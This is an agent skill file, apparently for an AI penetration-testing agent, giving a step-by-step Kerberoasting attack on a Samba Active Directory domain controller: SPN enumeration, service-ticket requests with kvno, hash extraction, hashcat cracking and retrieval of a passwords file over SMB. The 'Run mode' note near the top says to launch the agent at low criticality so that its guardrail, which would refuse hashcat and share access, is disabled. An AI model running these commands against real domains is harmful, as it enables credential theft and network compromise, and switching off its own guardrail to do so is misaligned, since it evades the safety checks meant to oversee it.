---
name: ad-kerberoast
description: Compromise a Samba/Windows Active Directory domain controller via Kerberoasting — enumerate SPNs, request a service ticket with native kinit+kvno, extract the RC4 krb5tgs hash, crack it with hashcat (-m 13100), then authenticate to retrieve protected data. Use when the target is an AD DC (Kerberos 88 / LDAP 389 / SMB 445 open) and you hold any valid low-privilege domain credential.
---

# Active Directory Kerberoasting (Samba AD DC)

> **Run mode:** launch coder56 at `criticality=low` for this engagement. The default
> guardrail is scoped to web-app pentests and would refuse `hashcat` / SMB-share access;
> low criticality disables it. (A guardrail-enabled AD run needs the deferred AD-aware
> carve-out in `guardrail.ts`.)

Kerberoasting abuses service tickets (TGS) for accounts that own an SPN. The KDC hands
you a ticket encrypted with the service account's password-derived key; you crack that
ticket offline to recover the account's plaintext password — **no online password
guessing, no logs on the DC beyond the normal TGS request**. This works against a Samba 4
AD DC exactly as against Windows.

## Prerequisites baked into this image
- `kinit`, `kvno`, `klist` (krb5-user) — the **native** Kerberos client. Use these; do NOT
  rely on `GetUserSPNs.py -request` (impacket's TGS authenticator is rejected by Samba's
  Heimdal KDC with `KRB_AP_ERR_INAPP_CKSUM`). `GetUserSPNs.py` is still good for *listing*
  SPNs via LDAP (no ticket request).
- `hashcat` (+ `pocl-opencl-icd`) — offline cracker, CPU mode. Use `--force`.
- `smbclient` — retrieve files from SMB shares.
- `/usr/share/wordlists/ad-lab.txt` — wordlist (target password is present).
- `/usr/local/bin/krb5cc-to-hashcat.py` — extracts a hashcat hash from a Kerberos ccache.

> **Do NOT try AS-REP roasting** on this DC. Samba 4.19's KDC does not honor
> `UF_DONT_REQUIRE_PREAUTH` (the bit is settable but preauth is still enforced). Kerberoast
> instead. (On a real Windows DC, AS-REP roasting would also be an option.)

## Variables (set these for YOUR target — discover them via recon, do NOT assume)
```
DC=<target_dc_ip>                     # the domain controller IP (nmap/LDAP rootDSE)
REALM=<UPPERCASE_REALM>                # Kerberos realm, UPPERCASE (from rootDSE / nmap -sV)
DOMAIN=<NETBIOS_DOMAIN>                # short NetBIOS domain (uppercased realm's first label)
ENTRYUSER=<a_valid_low_priv_account>   # a valid low-priv domain account YOU hold
ENTRYPASS='<its_password>'             # that account's password
```
All five must be filled from your own recon and the access you were given; nothing here is
target-specific.

## 1. Confirm the target is an AD DC
Scan the **single host** (not the whole subnet — keep it surgical):
```
nmap -p 88,389,445,135,53,464 -sV $DC
```
Ports 88 (Kerberos) + 389 (LDAP) + 445 (SMB) ⇒ it is an Active Directory domain controller.

## 2. Configure Kerberos to talk to this DC
Write a **multi-line** MIT krb5.conf (one-line `{ ...; ... }` blocks are Heimdal syntax
and MIT rejects them; write to `/etc/krb5.conf` so kinit/kvno/smbclient all see it):
```
cat > /etc/krb5.conf <<EOF
[libdefaults]
 default_realm = $REALM
 dns_lookup_realm = false
 dns_lookup_kdc = false
 udp_preference_limit = 1
[realms]
 $REALM = {
  kdc = $DC
  admin_server = $DC
 }
[domain_realm]
 .$(echo $REALM|tr 'A-Z' 'a-z') = $REALM
EOF
```

## 3. Get a TGT with your entry credential
```
echo "$ENTRYPASS" | kinit "$ENTRYUSER@$REALM"
klist                       # confirm a 'krbtgt/<REALM>' ticket exists
```

## 4. Discover Kerberoastable service accounts (SPNs)
List SPNs visible to your account (LDAP — does not request a ticket, so it is safe):
```
GetUserSPNs.py "$DOMAIN/$ENTRYUSER:$ENTRYPASS" -dc-ip $DC
```
Note each `ServicePrincipalName` and its account name (e.g. `MSSQLSvc/dc01.sc.local:1433`
→ account `svc_sql`). **Pick an account whose ticket you want to crack.**

## 5. Request a service ticket (native kvno — this is what actually works on Samba)
```
kvno 'MSSQLSvc/dc01.sc.local:1433@SC.LOCAL'
klist                       # a ticket for the SPN now appears in the ccache
```
`kvno` writes the ticket into `$KRB5CCNAME` (default `/tmp/krb5cc_0`).

## 6. Extract the crackable RC4 hash from the ccache
```
python3 /usr/local/bin/krb5cc-to-hashcat.py /tmp/krb5cc_0 svc_sql > /tmp/tgs.hash
head -1 /tmp/tgs.hash        # expect: $krb5tgs$23$*svc_sql$SC.LOCAL$...~1433*$...$...
```

## 7. Crack it (hashcat -m 13100 = Kerberos TGS-REP etype 23 / RC4)
```
hashcat -m 13100 --force -O /tmp/tgs.hash /usr/share/wordlists/ad-lab.txt
hashcat -m 13100 --force --show /tmp/tgs.hash     # prints: ...:RECOVERED_PASSWORD
```

## 8. Use the recovered credential to read the protected data
Authenticate to the DC as the cracked account and pull the secrets blob:
```
smbclient "//$DC/passwords\$" -U "$DOMAIN\\svc_sql%RECOVERED_PASSWORD" -c 'get passwords.txt /tmp/passwords.txt'
cat /tmp/passwords.txt
```
Report the `FLAG{...}` / secrets found. This proves full AD compromise.

## Troubleshooting
- **`kinit: Preauthentication failed`** — wrong password for the entry user; re-check it.
- **hashcat `No devices found`** — add `--force` (CPU/pocl backend); the wordlist is tiny so it still cracks in seconds.
- **`Token length exception`** in hashcat — the SPN in the hash had an unexpected form; re-run step 6 passing the exact account name.
- **Ticket not in ccache after kvno** — ensure `KRB5_CONFIG` points at step 2's file and the TGT from step 3 is still valid (`klist`).
- If RC4 is disabled on the target account (etype 17/18 in the hash, modes 19700/19800), cracking is impractical — pick a different SPN account.
